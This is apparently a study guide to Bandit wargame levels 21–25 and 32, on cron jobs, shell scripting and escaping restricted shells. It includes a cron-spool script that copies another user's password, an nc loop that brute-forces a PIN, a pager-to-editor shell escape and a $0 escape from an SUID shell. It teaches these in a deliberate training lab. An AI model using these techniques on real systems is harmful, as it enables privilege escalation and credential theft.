# Shell Scripting, Cron & Shell Escape

## Related Levels

- **Level 21** → Inspecting a system Cron job and tracing a fixed output path
- **Level 22** → Analyzing command substitution to predict a generated output filename
- **Level 23** → Writing a script for automated execution by a Cron job running as another user
- **Level 24** → Generating brute-force input with a shell loop over a single TCP connection
- **Level 25** → Identifying and escaping a non-standard login shell through a pager and editor
- **Level 32** → Escaping an input-transforming shell through parameter expansion

## Core Idea

Shell scripting combines commands into automated workflows, while Cron executes scheduled tasks under a specified user identity. The security question is which identity runs the code and who controls its input.

Restricted shells limit what a user can type or execute, but they still depend on other programs and shell expansion rules. Their weaknesses often come from these dependencies rather than from breaking the shell itself.

## Key Commands & Patterns

### 1. Inspecting System Cron Jobs

```bash
ls -la /etc/cron.d/
cat /etc/cron.d/cronjob_bandit22
cat /usr/bin/cronjob_bandit22.sh
```

- `ls -l` → Long Listing Format; `-a` → All, including hidden entries.
- `/etc/cron.d/` → Contains system-wide Cron definitions. Each entry includes a **user field** determining which account executes the command.
- `* * * * *` → Specifies minute, hour, day of month, month, and weekday. All wildcards mean every minute.
- `@reboot` → Runs the command once at system startup.
- `&> /dev/null` → Redirects both standard output and standard error, discarding the output.
- Reading the referenced script reveals what the scheduled command actually does.

### 2. Tracing a Fixed Output Path (Level 21)

The following commands represent the relevant operations performed by the scheduled script under the `bandit22` account:

```bash
chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
```

- The output path is hardcoded, so no calculation is needed.
- `chmod 644` → Owner read/write; group and others read-only.
- The scheduled script copies a protected password into a location readable by other users.

The lesson: a privileged process can expose protected data simply by writing it somewhere accessible.

### 3. Command Substitution and Generated Paths (Level 22)

```bash
myname=$(whoami)
mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
```

- `$(...)` → Command Substitution: replaces the expression with the command's standard output.
- `whoami` → Prints the effective username of the running process.
- `md5sum` → Computes the MD5 hash of its input.
- `cut -d ' '` → Uses a space as the delimiter; `-f 1` selects the first field.

The script runs as `bandit23`. Reproducing the same pipeline with that username predicts the output filename without executing the privileged script.

### 4. Writing a Script for Automated Execution (Level 23)

Prepare a working directory and an output file that the scheduled user can write to:

```bash
mkdir -p /tmp/mywork
chmod 755 /tmp/mywork
touch /tmp/mywork/password
chmod 666 /tmp/mywork/password
```

- `mkdir -p` → Parents: creates missing parent directories and does not fail if the target already exists.
- `chmod 755` on the directory → Owner has full access; group and others can read and traverse it. Directory traversal (`x`) is required to reach files inside.
- `touch` → Creates an empty file if it does not already exist.
- `chmod 666` on the output file → Grants read and write permissions to everyone.

Create the script:

```bash
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/mywork/password
```

Make it executable and place it where the job looks:

```bash
chmod 755 myscript.sh
cp myscript.sh /var/spool/bandit24/foo/
```

- `#!/bin/bash` → Shebang: specifies the interpreter used to execute the script.
- `chmod 755` on the script → Gives the owner read, write, and execute permissions, and gives group and others read and execute permissions.
- `/var/spool/bandit24/foo/` → Directory processed by the Level 23 Cron job. Verify the exact path in the job's script; it has changed between versions.

The job checks each entry's owner using `stat --format "%U"` and executes entries owned by `bandit23`. It uses `timeout -s 9 60` to limit execution to 60 seconds, then attempts to remove each entry with `rm -f`.

- `timeout -s 9 60` → Sends signal 9 (`SIGKILL`) when the 60-second limit is reached.
- `rm -f` → Force: removes files without prompting and ignores missing files.

The ownership check is the relevant filter; the script does not explicitly check for regular files. Keep a separate copy of your script because the submitted entry is removed after processing.

The output file is initially owned by the user who creates it. Since it is writable by `bandit24`, the scheduled script can write to it without changing its ownership. `>` truncates an existing file rather than recreating it, so ownership and permissions are preserved.

The directory must be traversable by `bandit24`, and the output file must be writable by that user.

### 5. Loops for Repeated Network Input (Level 24)

```bash
password=$(cat /etc/bandit_pass/bandit24)

for i in {0000..9999}; do
    echo "$password $i"
done | nc localhost 30002
```

- `$(...)` → Captures the output of a command in a variable.
- `{0000..9999}` → Brace Expansion: generates zero-padded four-digit values.
- `"$password $i"` → Expands both variables while keeping them together on one input line.
- `| nc` → Sends all generated input through a single TCP connection.

The loop automates PIN attempts without opening a new connection for every candidate.

### 6. Identifying and Escaping a Non-Standard Login Shell (Level 25)

```bash
grep '^bandit26:' /etc/passwd
cat /usr/bin/showtext
```

- `'^bandit26:'` → Anchored pattern: matches the account entry only at the start of a line.
- The last field of `/etc/passwd` specifies the user's login shell; here it is `/usr/bin/showtext`.
- That script runs `more ~/text.txt` and then exits, which is why the session closes immediately.

Reducing the terminal height makes the text exceed one screen, so `more` enters interactive mode instead of printing and exiting.

**Pager and editor escape:**

```text
more → v → :set shell=/bin/bash → :shell
```

- `v` → Opens the editor from inside the pager.
- `:set shell=/bin/bash` → Changes which shell the editor launches; otherwise, the restricted login shell may be started again.
- `:shell` → Starts a shell from inside the editor.

**Alternative without spawning a shell:**

```text
:e /etc/bandit_pass/bandit26
```

Opens the password file directly inside the editor.

### 7. Escaping an Input-Transforming Shell (Level 32)

```text
uppershell> $0
```

The prompt is shown for context; the command entered is `$0`.

- The shell converts typed input to uppercase, so ordinary lowercase commands fail.
- `$0` → Special Parameter: expands to the name or path of the current shell or script.
- `$` and `0` have no uppercase form, so the expansion survives the transformation.

The `uppershell` executable is owned by `bandit33` and has its SUID bit set, so the process starts with `bandit33` as its effective user identity. The shell reached through `$0` inherits that identity in this challenge.

## How They Work Together

1. **Trace scheduled execution (Levels 21–22):** Read the Cron entry, identify the execution user, and follow the script to its output path — first fixed, then computed.
2. **Supply executable code (Level 23):** Place an eligible script where a privileged job looks for entries, so it runs under another user's identity.
3. **Automate network interaction (Level 24):** Generate candidates with a loop and send them over one connection. See [Networking Services](./06-Networking-Services.md).
4. **Escape restricted environments (Levels 25, 32):** Use two distinct techniques: exploiting an interactive program's features and taking advantage of shell parameter expansion. Level 32 also links shell escape to SUID privileges. See [Permissions & SUID](./07-Permissions-SUID.md).

## Important Notes

- Cron runs scheduled commands without an interactive login session and may provide a minimal environment. Use absolute paths where appropriate.
- The user field in system Cron entries determines the identity under which a scheduled command runs.
- Privileged jobs that execute user-controlled entries can create privilege-escalation vulnerabilities, even when they filter by file ownership.
- Directory permissions and file permissions solve different problems: `x` allows traversing a directory, `r` allows listing its contents, and creating or removing directory entries generally requires both `w` and `x`.
- Files created by another account belong to that account; plan the output path and permissions before submitting the script.
- `crontab -l` lists only the current user's own crontab, not entries stored in `/etc/cron.d/`.
- `$(...)` performs command substitution; brace expansion generates sequences. They are different mechanisms.
- A restricted shell limits an interface, not necessarily the capabilities of every program it can access.
- Pager and editor escapes depend on available features and configuration.
- SUID establishes the effective identity when the executable starts; escaped shells inherit it rather than gaining it at escape time.
- World-writable permissions such as `666` are useful in this controlled lab example but should not be used casually in production environments.

## Related Concepts

- [SSH Authentication](./05-SSH-Authentication.md) — Login shells, non-interactive execution, and shell initialization.
- [Networking Services](./06-Networking-Services.md) — Sending loop-generated input to a TCP service.
- [Permissions & SUID](./07-Permissions-SUID.md) — File permissions, process identity, and the SUID shell in Level 32.
- [File Content Analysis](./03-File-Content-Analysis.md) — Inspecting scripts, configuration files, and service responses.
